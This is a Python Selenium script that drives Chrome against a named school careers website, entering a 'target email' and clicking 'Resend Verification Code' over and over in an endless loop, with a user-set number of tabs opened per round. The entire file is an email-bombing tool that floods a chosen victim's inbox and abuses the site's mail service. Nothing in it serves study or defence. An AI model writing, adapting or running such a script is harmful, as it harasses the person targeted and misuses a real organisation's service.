from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.keys import Keys
from time import sleep
import sys, os

# the chromedriver.exe is required in a folder named "chromedriver_win32" in the same directory as this file

def hacky():
    while True:
        current_directory = str(__file__).strip('main.py')
        options = webdriver.ChromeOptions()
        options.add_argument(f"user-data-dir={current_directory}{profile_location}/")
        driver = webdriver.Chrome(executable_path='{}chromedriver_win32/chromedriver.exe'.format(current_directory), chrome_options=options)

        def click_submit():
            element = driver.find_element_by_xpath("//input[@type='submit']" and "//input[@class='btn btn-success']" and "//input[@value='Resend Verification Code']")
            ActionChains(driver) \
                .key_down(Keys.CONTROL) \
                .click(element) \
                .key_up(Keys.CONTROL) \
                .perform()

        driver.get('https://app.careercentral.school.nz/contact')
        try:
            sleep(0.2)
            driver.find_element_by_xpath("//input[@class='form-control']" and "//input[@id='inputPrimary']").send_keys(f'{target_email}')
            for i in range(int(ram_power)):
                click_submit()
            
            sleep(2)
        except:
            print('error')

        driver.quit()

def firsttime():
    current_directory = str(__file__).strip('main.py')
    options = webdriver.ChromeOptions()
    options.add_argument(f"user-data-dir={current_directory}{profile_location}/")
    driver = webdriver.Chrome(executable_path='{}chromedriver_win32/chromedriver.exe'.format(current_directory), chrome_options=options)

    driver.get('https://app.careercentral.school.nz/contact')

if __name__ == "__main__":
    global target_email, ram_power, profile_location
    profile_location = input('[i] Enter the folder that stores your chrome profile >> ')

    if os.path.exists(f"./{profile_location}") == False:
        print('[i] Creating profile folder ... ', end='')
        os.mkdir(f"./{profile_location}")
        print('DONE')
        print('[i] Starting first time setup ...\n[i] Please enter your login to the website and restart the script when finished')
        for i in range(5):
            print(f'[i] Starting in {5 - i} seconds ... ', end='\r')
            sleep(1)
        
        print('\n')
        firsttime()

    target_email = input('[i] Please Enter the Target Email Address >> ')
    ram_power = input('[i] Enter how many browser tabs to open each iteration >> ')
    hacky()